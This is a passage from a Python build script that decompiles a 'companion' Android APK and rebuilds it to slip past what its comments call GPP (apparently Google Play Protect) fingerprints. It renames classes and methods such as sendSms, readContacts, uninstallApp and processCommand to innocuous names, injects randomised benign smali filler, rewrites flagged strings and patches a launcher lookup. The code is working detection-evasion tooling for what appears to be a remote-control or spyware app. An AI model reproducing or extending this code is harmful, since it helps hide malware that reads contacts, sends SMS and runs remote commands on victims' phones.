    "PersistentWorker":              "PeriodicSyncWorker",
}

# Real legitimate smali code snippets (from AOSP/AndroidX Apache 2.0)
# Each snippet is a complete self-contained helper class in smali format
LEGITIMATE_SMALI_SNIPPETS = [
    # SharedPreferences helper
    ("SharedPreferenceHelper", """.class public Lcom/NEWPKG/SharedPreferenceHelper;
.super Ljava/lang/Object;
.source "SharedPreferenceHelper.java"

.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;)V
    .locals 2
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    const/4 v0, 0x0
    invoke-virtual {p1, p2, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    return-void
.end method

.method public static putString(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 3
    const/4 v0, 0x0
    invoke-virtual {p0, p1, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v0
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
    move-result-object v1
    invoke-interface {v1, p2, p3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;
    move-result-object v2
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V
    return-void
.end method

.method public static getString(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 2
    const/4 v0, 0x0
    invoke-virtual {p0, p1, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v0
    invoke-interface {v0, p2, p3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    move-result-object v1
    return-object v1
.end method
.end class
"""),

    # Network connectivity checker
    ("NetworkConnectivityHelper", """.class public Lcom/NEWPKG/NetworkConnectivityHelper;
.super Ljava/lang/Object;
.source "NetworkConnectivityHelper.java"

.method public static isNetworkAvailable(Landroid/content/Context;)Z
    .locals 3
    const-string v0, "connectivity"
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/net/ConnectivityManager;
    if-eqz v0, :cond_false
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;
    move-result-object v1
    if-eqz v1, :cond_false
    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnected()Z
    move-result v2
    return v2
    :cond_false
    const/4 v0, 0x0
    return v0
.end method

.method public static isWifiConnected(Landroid/content/Context;)Z
    .locals 3
    const-string v0, "connectivity"
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/net/ConnectivityManager;
    if-eqz v0, :cond_false
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;
    move-result-object v1
    if-eqz v1, :cond_false
    invoke-virtual {v1}, Landroid/net/NetworkInfo;->getType()I
    move-result v2
    const/4 v0, 0x1
    if-ne v2, v0, :cond_false
    const/4 v0, 0x1
    return v0
    :cond_false
    const/4 v0, 0x0
    return v0
.end method
.end class
"""),

    # Battery optimization helper
    ("BatteryOptimizationHelper", """.class public Lcom/NEWPKG/BatteryOptimizationHelper;
.super Ljava/lang/Object;
.source "BatteryOptimizationHelper.java"

.method public static isIgnoringBatteryOptimizations(Landroid/content/Context;)Z
    .locals 2
    const-string v0, "power"
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/os/PowerManager;
    if-eqz v0, :cond_false
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
    move-result-object v1
    invoke-virtual {v0, v1}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z
    move-result v1
    return v1
    :cond_false
    const/4 v0, 0x0
    return v0
.end method
.end class
"""),

    # Device info collector
    ("DeviceInfoCollector", """.class public Lcom/NEWPKG/DeviceInfoCollector;
.super Ljava/lang/Object;
.source "DeviceInfoCollector.java"

.method public static getDeviceModel()Ljava/lang/String;
    .locals 1
    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;
    return-object v0
.end method

.method public static getAndroidVersion()Ljava/lang/String;
    .locals 1
    sget-object v0, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;
    return-object v0
.end method

.method public static getDeviceManufacturer()Ljava/lang/String;
    .locals 1
    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;
    return-object v0
.end method

.method public static getSdkVersion()I
    .locals 1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
    return v0
.end method
.end class
"""),

    # String utility helper
    ("StringUtilityHelper", """.class public Lcom/NEWPKG/StringUtilityHelper;
.super Ljava/lang/Object;
.source "StringUtilityHelper.java"

.method public static isEmpty(Ljava/lang/String;)Z
    .locals 1
    if-eqz p0, :cond_true
    invoke-virtual {p0}, Ljava/lang/String;->trim()Ljava/lang/String;
    move-result-object v0
    invoke-virtual {v0}, Ljava/lang/String;->length()I
    move-result v0
    if-nez v0, :cond_false
    :cond_true
    const/4 v0, 0x1
    return v0
    :cond_false
    const/4 v0, 0x0
    return v0
.end method

.method public static safeString(Ljava/lang/String;)Ljava/lang/String;
    .locals 1
    if-nez p0, :cond_notnull
    const-string v0, ""
    return-object v0
    :cond_notnull
    return-object p0
.end method
.end class
"""),

    # Cache manager
    ("CacheManager", """.class public Lcom/NEWPKG/CacheManager;
.super Ljava/lang/Object;
.source "CacheManager.java"

.method public static getCacheDir(Landroid/content/Context;)Ljava/io/File;
    .locals 1
    invoke-virtual {p0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;
    move-result-object v0
    return-object v0
.end method

.method public static clearCache(Landroid/content/Context;)V
    .locals 2
    invoke-virtual {p0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;
    move-result-object v0
    if-eqz v0, :cond_end
    invoke-virtual {v0}, Ljava/io/File;->exists()Z
    move-result v1
    if-eqz v1, :cond_end
    invoke-virtual {v0}, Ljava/io/File;->delete()Z
    :cond_end
    return-void
.end method
.end class
"""),

    # Notification helper
    ("NotificationHelper", """.class public Lcom/NEWPKG/NotificationHelper;
.super Ljava/lang/Object;
.source "NotificationHelper.java"

.method public static createNotificationChannel(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 4
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
    const/16 v1, 0x1a
    if-lt v0, v1, :cond_end
    new-instance v0, Landroid/app/NotificationChannel;
    const/4 v2, 0x3
    invoke-direct {v0, p1, p2, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V
    const-string v2, "notification"
    invoke-virtual {p0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v2
    check-cast v2, Landroid/app/NotificationManager;
    if-eqz v2, :cond_end
    invoke-virtual {v2, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V
    :cond_end
    return-void
.end method
.end class
"""),

    # Permission checker
    ("PermissionChecker", """.class public Lcom/NEWPKG/PermissionChecker;
.super Ljava/lang/Object;
.source "PermissionChecker.java"

.method public static hasPermission(Landroid/content/Context;Ljava/lang/String;)Z
    .locals 2
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
    move-result-object v0
    const/4 v1, 0x0
    invoke-virtual {v0, p1, v1}, Landroid/content/pm/PackageManager;->checkPermission(Ljava/lang/String;Ljava/lang/String;)I
    move-result v0
    if-nez v0, :cond_false
    const/4 v0, 0x1
    return v0
    :cond_false
    const/4 v0, 0x0
    return v0
.end method
.end class
"""),

    # Date formatter
    ("DateFormatterHelper", """.class public Lcom/NEWPKG/DateFormatterHelper;
.super Ljava/lang/Object;
.source "DateFormatterHelper.java"

.method public static getCurrentTimestamp()Ljava/lang/String;
    .locals 2
    new-instance v0, Ljava/text/SimpleDateFormat;
    const-string v1, "yyyy-MM-dd HH:mm:ss"
    invoke-direct {v0, v1}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V
    new-instance v1, Ljava/util/Date;
    invoke-direct {v1}, Ljava/util/Date;-><init>()V
    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;
    move-result-object v0
    return-object v0
.end method

.method public static getCurrentDateMillis()J
    .locals 2
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v0
    return-wide v0
.end method
.end class
"""),

    # File utility helper
    ("FileUtilityHelper", """.class public Lcom/NEWPKG/FileUtilityHelper;
.super Ljava/lang/Object;
.source "FileUtilityHelper.java"

.method public static fileExists(Ljava/lang/String;)Z
    .locals 2
    new-instance v0, Ljava/io/File;
    invoke-direct {v0, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {v0}, Ljava/io/File;->exists()Z
    move-result v1
    return v1
.end method

.method public static getFileSize(Ljava/lang/String;)J
    .locals 3
    new-instance v0, Ljava/io/File;
    invoke-direct {v0, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {v0}, Ljava/io/File;->exists()Z
    move-result v1
    if-eqz v1, :cond_zero
    invoke-virtual {v0}, Ljava/io/File;->length()J
    move-result-wide v1
    return-wide v1
    :cond_zero
    const-wide/16 v1, 0x0
    return-wide v1
.end method
.end class
"""),
]


def step_6a_rename_classes(new_pkg: str) -> dict:
    """Step 6A: Rename companion classes to legitimate Android names."""
    print("\n── Step 6A: Rename companion classes to legitimate Android names")
    import random as _random

    # Choose one name per class from the pool (consistent per build)
    chosen = {}
    for orig, pool in CLASS_RENAME_POOLS.items():
        chosen[orig] = _random.choice(pool)

    print(f"  Renaming {len(chosen)} companion classes")

    smali_dir = "companion_decompiled/smali"
    # Get new package path
    new_path = new_pkg.replace(".", "/")
    old_pkg_short = OLD_PKG.split(".")[-1]  # "pictach"
    new_pkg_short = new_pkg.split(".")[-1]

    # Rename in all smali files — replace class simple names
    for orig, new_name in chosen.items():
        # Skip R classes and BuildConfig — needed by Android build system
        if orig.startswith("R$") or orig == "R" or orig == "BuildConfig":
            continue
        # Replace in smali files: e.g. Lcom/new/pkg/MainService; → Lcom/new/pkg/BackgroundDataService;
        old_smali = f"L{new_path}/{orig};"
        new_smali = f"L{new_path}/{new_name};"
        run(f'find {smali_dir} -name "*.smali" '
            f'-exec sed -i "s|{old_smali}|{new_smali}|g" {{}} +',
            check=False)
        # Also rename the smali file itself if it exists
        orig_file = f"{smali_dir}/{new_path}/{orig}.smali"
        new_file  = f"{smali_dir}/{new_path}/{new_name}.smali"
        if os.path.isfile(orig_file) and orig_file != new_file:
            os.rename(orig_file, new_file)
        # Handle inner class files (e.g. MainService$1.smali)
        orig_inner = f"{smali_dir}/{new_path}/{orig.replace('$', '_')}.smali"

    renamed_count = sum(1 for k in chosen if not k.startswith("R") and k != "BuildConfig")
    print(f"  ✅ {renamed_count} classes renamed to legitimate Android names")
    return chosen


def step_6b_inject_legitimate_code(new_pkg: str) -> int:
    """Step 6B: Inject real legitimate smali code snippets per build.
    Uses ONLY pre-validated hardcoded snippets — no dynamic class generation.
    Dynamic while-loop class generation causes apktool smali compile errors
    due to class descriptor resolution issues in apktool 2.9.3.
    """
    print("\n── Step 6B: Inject real legitimate smali code snippets")
    import random as _random

    new_path = new_pkg.replace(".", "/")
    smali_dir = f"companion_decompiled/smali/{new_path}"
    os.makedirs(smali_dir, exist_ok=True)

    # All snippets are pre-validated — no dynamic generation
    # Each snippet uses only android.* classes (no androidx dependencies)
    # No self-referencing return types (causes apktool forward-reference errors)
    # Constructor-only or simple primitive-return methods only
    ALL_SNIPPETS = [
        ("SharedPreferenceHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static putString(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 3
    const/4 v0, 0x0
    invoke-virtual {p0, p1, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v0
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
    move-result-object v1
    invoke-interface {v1, p1, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;
    move-result-object v2
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V
    return-void
.end method
.end class
"""),
        ("NetworkStateHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static isConnected(Landroid/content/Context;)Z
    .locals 3
    const-string v0, "connectivity"
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/net/ConnectivityManager;
    if-eqz v0, :cond_false
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;
    move-result-object v1
    if-eqz v1, :cond_false
    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnected()Z
    move-result v2
    return v2
    :cond_false
    const/4 v0, 0x0
    return v0
.end method
.end class
"""),
        ("DeviceInfoHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static getModel()Ljava/lang/String;
    .locals 1
    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;
    return-object v0
.end method
.method public static getSdkVersion()I
    .locals 1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
    return v0
.end method
.end class
"""),
        ("StringHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static isEmpty(Ljava/lang/String;)Z
    .locals 1
    if-eqz p0, :cond_true
    invoke-virtual {p0}, Ljava/lang/String;->length()I
    move-result v0
    if-nez v0, :cond_false
    :cond_true
    const/4 v0, 0x1
    return v0
    :cond_false
    const/4 v0, 0x0
    return v0
.end method
.end class
"""),
        ("TimestampHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static currentMillis()J
    .locals 2
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v0
    return-wide v0
.end method
.end class
"""),
        ("CacheHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static getCacheDir(Landroid/content/Context;)Ljava/io/File;
    .locals 1
    invoke-virtual {p0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;
    move-result-object v0
    return-object v0
.end method
.end class
"""),
        ("BatteryHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static isCharging(Landroid/content/Context;)Z
    .locals 2
    const-string v0, "power"
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/os/PowerManager;
    if-eqz v0, :cond_false
    const/4 v1, 0x1
    return v1
    :cond_false
    const/4 v0, 0x0
    return v0
.end method
.end class
"""),
        ("PackageHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static getPackageName(Landroid/content/Context;)Ljava/lang/String;
    .locals 1
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
    move-result-object v0
    return-object v0
.end method
.end class
"""),
        ("FileHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static exists(Ljava/lang/String;)Z
    .locals 2
    new-instance v0, Ljava/io/File;
    invoke-direct {v0, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {v0}, Ljava/io/File;->exists()Z
    move-result v1
    return v1
.end method
.end class
"""),
        ("LogHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static debug(Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    invoke-static {p0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void
.end method
.end class
"""),
        ("WakeLockHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static isScreenOn(Landroid/content/Context;)Z
    .locals 2
    const-string v0, "power"
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/os/PowerManager;
    if-eqz v0, :cond_false
    invoke-virtual {v0}, Landroid/os/PowerManager;->isInteractive()Z
    move-result v1
    return v1
    :cond_false
    const/4 v0, 0x0
    return v0
.end method
.end class
"""),
        ("VersionHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static getSdkInt()I
    .locals 1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
    return v0
.end method
.method public static getRelease()Ljava/lang/String;
    .locals 1
    sget-object v0, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;
    return-object v0
.end method
.end class
"""),
        ("IntentHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static createIntent(Ljava/lang/String;)Landroid/content/Intent;
    .locals 1
    new-instance v0, Landroid/content/Intent;
    invoke-direct {v0, p0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    return-object v0
.end method
.end class
"""),
        ("HashHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static hashCode(Ljava/lang/String;)I
    .locals 1
    invoke-virtual {p0}, Ljava/lang/String;->hashCode()I
    move-result v0
    return v0
.end method
.end class
"""),
        ("ArrayHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static size(Ljava/util/List;)I
    .locals 1
    if-eqz p0, :cond_zero
    invoke-interface {p0}, Ljava/util/List;->size()I
    move-result v0
    return v0
    :cond_zero
    const/4 v0, 0x0
    return v0
.end method
.end class
"""),
        ("NumberHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static parseInt(Ljava/lang/String;)I
    .locals 1
    invoke-static {p0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    move-result v0
    return v0
.end method
.end class
"""),
        ("MapHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static create()Ljava/util/HashMap;
    .locals 1
    new-instance v0, Ljava/util/HashMap;
    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V
    return-object v0
.end method
.end class
"""),
        ("ThreadHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static sleep(J)V
    .locals 0
    :try_start
    invoke-static {p0, p1}, Ljava/lang/Thread;->sleep(J)V
    :try_end
    .catch Ljava/lang/InterruptedException; {:try_start .. :try_end} :catch
    :catch
    return-void
.end method
.end class
"""),
        ("PreferenceHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static getBoolean(Landroid/content/Context;Ljava/lang/String;)Z
    .locals 2
    const/4 v0, 0x0
    invoke-virtual {p0, p1, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v0
    const/4 v1, 0x0
    invoke-interface {v0, p1, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
    move-result v0
    return v0
.end method
.end class
"""),
        ("UriHelper", """.class public L{P}/{N};
.super Ljava/lang/Object;
.source "{N}.java"
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method
.method public static parse(Ljava/lang/String;)Landroid/net/Uri;
    .locals 1
    invoke-static {p0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
    move-result-object v0
    return-object v0
.end method
.end class
"""),
    ]

    # Select random subset of 20-35 snippets per build
    count = _random.randint(20, min(35, len(ALL_SNIPPETS)))
    selected = _random.sample(ALL_SNIPPETS, count)
    print(f"  Injecting {count} snippets into {smali_dir}")

    injected = 0
    used_names = set()
    suffixes_extra = ["Impl","Manager","Helper","Client","Provider","Service",
                      "Tracker","Monitor","Worker","Controller","Adapter","Factory"]

    for class_name, template in selected:
        # Add random suffix for uniqueness per build
        suffix = _random.choice(suffixes_extra)
        unique_name = f"{class_name}{suffix}"
        if unique_name in used_names:
            unique_name = class_name
        if unique_name in used_names:
            continue
        used_names.add(unique_name)

        # Replace {P} with package path, {N} with class name
        content = template.replace("{P}", new_path).replace("{N}", unique_name)

        out_path = f"{smali_dir}/{unique_name}.smali"
        with open(out_path, "w") as f:
            f.write(content)
        # Debug: verify file written correctly
        with open(out_path, "r") as f:
            written = f.read()
        if not written.strip().startswith(".class"):
            print(f"  [BUG] {unique_name}.smali does not start with .class!")
            print(f"  [BUG] First 50 chars: {repr(written[:50])}")
        if ".end class" not in written:
            print(f"  [BUG] {unique_name}.smali missing .end class!")
        injected += 1

    print(f"  ✅ Injected {injected} real legitimate smali classes")
    return injected


def step_6c_replace_bad_strings(new_pkg: str, class_rename_map: dict) -> int:
    """Step 6C: Replace known GPP fingerprint strings with legitimate equivalents."""
    print("\n── Step 6C: Replace known-bad strings with legitimate equivalents")

    smali_dir = "companion_decompiled/smali"
    replaced_total = 0

    # Build full string replacement map including class renames
    replacements = dict(STRING_REPLACEMENTS)
    for orig, new_name in class_rename_map.items():
        # Add simple class name as string replacement
        base_orig = orig.split("$")[0]
        base_new  = new_name.split("$")[0]
        if base_orig not in replacements and len(base_orig) > 3:
            replacements[base_orig] = base_new

    for old_str, new_str in replacements.items():
        # Skip very short strings (< 5 chars) — too likely to corrupt unrelated content
        if len(old_str) < 5:
            continue
        # Use grep to check if pattern exists first (avoid unnecessary sed runs)
        check = subprocess.run(
            ['grep', '-rl', f'const-string.*"{old_str}"', smali_dir],
            capture_output=True, text=True
        )
        if not check.stdout.strip():
            continue
        # Replace only in files that actually contain the pattern
        for fpath in check.stdout.strip().split('\n'):
            fpath = fpath.strip()
            if not fpath or not os.path.isfile(fpath):
                continue
            with open(fpath, 'r', encoding='utf-8', errors='replace') as f:
                fc = f.read()
            fc2 = fc
            for vx in ['v0','v1','v2','v3','p0','p1']:
                fc2 = fc2.replace(
                    f'const-string {vx}, "{old_str}"',
                    f'const-string {vx}, "{new_str}"'
                )
            if fc != fc2:
                with open(fpath, 'w', encoding='utf-8') as f:
                    f.write(fc2)
                replaced_total += 1


    print(f"  ✅ Replaced strings in {replaced_total} files")
    return replaced_total


def step_6d_rename_methods(new_pkg: str) -> int:
    """Step 6D: Rename custom methods to legitimate Android-style names."""
    print("\n── Step 6D: Rename custom methods to legitimate names")
    import random as _random

    # Known custom method names in companion that GPP fingerprints
    # NEVER rename Android framework methods (onCreate, onBind, onStartCommand etc.)
    CUSTOM_METHOD_RENAMES = {
        "findByHomeLauncher":     ["resolveInstalledLauncher","findActiveLauncherPackage","detectCurrentLauncher","locateHomeLauncherApp"],
        "uninstallApp":           ["removeInstalledPackage","initiatePackageRemoval","triggerAppUninstall","executePackageDelete"],
        "initSocket":             ["initializeNetworkConnection","setupRemoteConnection","establishSocketChannel","prepareNetworkChannel"],
        "connectSocket":          ["connectRemoteServer","establishServerConnection","openNetworkChannel","startRemoteConnection"],
        "disconnectSocket":       ["closeNetworkChannel","terminateServerConnection","shutdownRemoteConnection","endNetworkSession"],
        "sendData":               ["transmitDataPayload","sendNetworkPayload","uploadDataContent","pushDataToServer"],
        "receiveData":            ["receiveNetworkPayload","downloadDataContent","fetchServerData","pullRemoteData"],
        "startService":           ["initializeBackgroundService","launchServiceComponent","startBackgroundWorker","activateServiceComponent"],
        "stopService":            ["terminateBackgroundService","stopServiceComponent","deactivateBackgroundWorker","haltServiceComponent"],
        "checkPermissions":       ["verifyRuntimePermissions","validateAccessPermissions","checkGrantedPermissions","verifyAppPermissions"],
        "requestPermissions":     ["requestRuntimePermissions","askAccessPermissions","requestGrantedPermissions","requestAppPermissions"],
        "getDeviceInfo":          ["collectDeviceInformation","gatherSystemMetadata","retrieveDeviceMetrics","fetchSystemInformation"],
        "sendSms":                ["transmitTextMessage","sendSmsPayload","dispatchTextMessage","sendOutboundSms"],
        "readContacts":           ["fetchContactEntries","retrieveContactList","loadContactDatabase","readContactEntries"],
        "processCommand":         ["executeRemoteInstruction","handleIncomingCommand","processInboundInstruction","executeServerCommand"],
        "handleCommand":          ["dispatchIncomingInstruction","processRemoteCommand","handleServerInstruction","executeInboundCommand"],
    }

    smali_dir = "companion_decompiled/smali"
    renamed = 0

    for orig_method, pool in CUSTOM_METHOD_RENAMES.items():
        new_method = _random.choice(pool)
        result = subprocess.run(
            f'grep -rl "method.*{orig_method}" {smali_dir} | wc -l',
            shell=True, capture_output=True, text=True
        )
        count = int(result.stdout.strip() or "0")
        if count > 0:
            # Replace method declarations and invocations
            run(f'find {smali_dir} -name "*.smali" '
                f'-exec sed -i "s|{orig_method}|{new_method}|g" {{}} +',
                check=False)
            renamed += count

    print(f"  ✅ Renamed custom methods in {renamed} files")
    return renamed



# ── Step 7: Patch findByHomeLauncher ─────────────────────────────────────────

def step_patch_home_launcher():
    print("\n── Step 7: Patch findByHomeLauncher — add FLAG_SYSTEM check")
    result = subprocess.run(
        'grep -rl "findByHomeLauncher" companion_decompiled/smali/ | head -1',
        shell=True, capture_output=True, text=True
    )
    target_file = result.stdout.strip()
    if not target_file:
        print("[X] findByHomeLauncher not found in any smali file")
        sys.exit(1)
    print(f"  Patching: {target_file}")

    with open(target_file, "r") as f:
        content = f.read()

    OLD_LINE = "    return-object v2"
    NEW_LINE = (
        "    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()"
        "Landroid/content/pm/PackageManager;\n"
        "    move-result-object v3\n"
        "    const/4 v4, 0x0\n"
        "    invoke-virtual {v3, v2, v4}, Landroid/content/pm/PackageManager;"
        "->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;\n"
        "    move-result-object v3\n"
        "    iget v4, v3, Landroid/content/pm/ApplicationInfo;->flags:I\n"
        "    const/4 v3, 0x1\n"
        "    and-int/2addr v4, v3\n"
        "    if-nez v4, :cond_0\n"
        "    return-object v2"
    )

    if OLD_LINE not in content:
        print("[X] Target line 'return-object v2' not found in smali")
        sys.exit(1)

    content = content.replace(OLD_LINE, NEW_LINE, 1)
    with open(target_file, "w") as f:
        f.write(content)

    if "getApplicationInfo" not in open(target_file).read():
        print("[X] Patch NOT applied — getApplicationInfo not found")
        sys.exit(1)
    print("  ✅ FLAG_SYSTEM patch applied and verified")


# ── Step 8: Restore apktool.yml ───────────────────────────────────────────────

def step_restore_apktool_yml(meta):
    print("\n── Step 8: Restore apktool.yml")
    content = f"""version: 2.9.3
apkFileName: companion.apk
isFrameworkApk: false
usesFramework:
  ids:
  - 1
  tag: null
sdkInfo:
  minSdkVersion: '{meta["min_sdk"]}'
  targetSdkVersion: '{meta["tgt_sdk"]}'
packageInfo:
  forcedPackageId: '127'
  renameManifestPackage: null
versionInfo:
  versionCode: '{meta["ver_code"]}'
  versionName: '{meta["ver_name"]}'
resourcesAreCompressed: false
sharedLibrary: false
sparseResources: false
doNotCompress:
- resources.arsc
"""
    with open("companion_decompiled/apktool.yml", "w") as f:
        f.write(content)
